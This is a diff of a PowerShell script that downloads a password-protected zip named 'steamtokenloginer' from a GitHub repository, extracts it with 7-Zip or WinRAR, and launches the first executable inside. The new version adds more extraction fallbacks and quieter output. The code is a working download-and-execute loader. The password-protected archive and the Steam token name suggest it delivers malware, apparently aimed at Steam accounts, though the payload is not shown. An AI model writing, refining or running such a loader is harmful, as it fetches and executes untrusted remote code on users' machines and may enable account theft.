@@ -1,35 +1,32 @@
-$zipUrl="https://github.com/gseff137-afk/test/raw/refs/heads/main/steamtokenloginer.zip"
+$zipUrl="https://github.com/gseff137-afk/test/raw/refs/heads/main/steamtokenloginer_1.zip"
 $targetFolder="C:\Users\zenas\Desktop\Новая папка (7)"
 $zipPath="$targetFolder\steamtokenloginer.zip"
+$extractPath="$targetFolder\steamtokenloginer"
+$password="5555"
 
 if(-not(Test-Path $targetFolder)){New-Item -ItemType Directory -Path $targetFolder -Force}
 
 try{
-    # Скачиваем и проверяем размер
     Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath
-    $zipSize=(Get-Item $zipPath).Length/1MB
-    Write-Host "ZIP size: $([math]::Round($zipSize,2)) MB"
+    $fileSize=(Get-Item $zipPath).Length
     
-    if($zipSize -gt 0){
-        # Пробуем распаковать
-        $7zipPath="$env:ProgramFiles\7-Zip\7z.exe"
-        if(Test-Path $7zipPath){
-            & $7zipPath x "-p5555" "-o$targetFolder" "-y" $zipPath
+    if($fileSize -gt 0){
+        function Test-ExtractionSuccess{return(Test-Path $extractPath)-and(Get-ChildItem $extractPath -ErrorAction SilentlyContinue).Count -gt 0}
+        
+        $7zipPaths=@("$env:ProgramFiles\7-Zip\7z.exe","${env:ProgramFiles(x86)}\7-Zip\7z.exe")
+        foreach($7zipPath in $7zipPaths){if(Test-Path $7zipPath){& $7zipPath x "-p$password" "-o$extractPath" "-y" $zipPath | Out-Null;if(Test-ExtractionSuccess){break}}}
+        
+        if(-not(Test-ExtractionSuccess)){
+            $winrarPaths=@("$env:ProgramFiles\WinRAR\WinRAR.exe","${env:ProgramFiles(x86)}\WinRAR\WinRAR.exe")
+            foreach($winrarPath in $winrarPaths){if(Test-Path $winrarPath){& $winrarPath x "-p$password" "-y" "-ibck" $zipPath $extractPath | Out-Null;if(Test-ExtractionSuccess){break}}}
         }
         
-        # Проверяем распакованные файлы
-        $extractedFiles=Get-ChildItem $targetFolder -Recurse | Where-Object{$_.Name -ne "steamtokenloginer.zip"}
-        foreach($file in $extractedFiles){
-            Write-Host "File: $($file.Name) - $([math]::Round($file.Length/1KB,2)) KB"
-        }
-        
-        # Запускаем EXE если найден
-        $exeFile=$extractedFiles | Where-Object{$_.Extension -eq '.exe'} | Select-Object -First 1
-        if($exeFile -and $exeFile.Length -gt 0){
-            Start-Process -FilePath $exeFile.FullName
+        if(Test-ExtractionSuccess){
+            $exeFile=Get-ChildItem $extractPath | Where-Object{$_.Extension -eq '.exe'} | Select-Object -First 1
+            if($exeFile){Start-Process -FilePath "$extractPath\$($exeFile.Name)"}else{Invoke-Item $extractPath}
         }else{
-            Write-Host "EXE file not found or corrupted"
+            Write-Host "Extraction failed - try manual extraction with password: $password"
             Invoke-Item $targetFolder
         }
     }
-}catch{$_}
+}catch{Write-Host "Error: $_"}
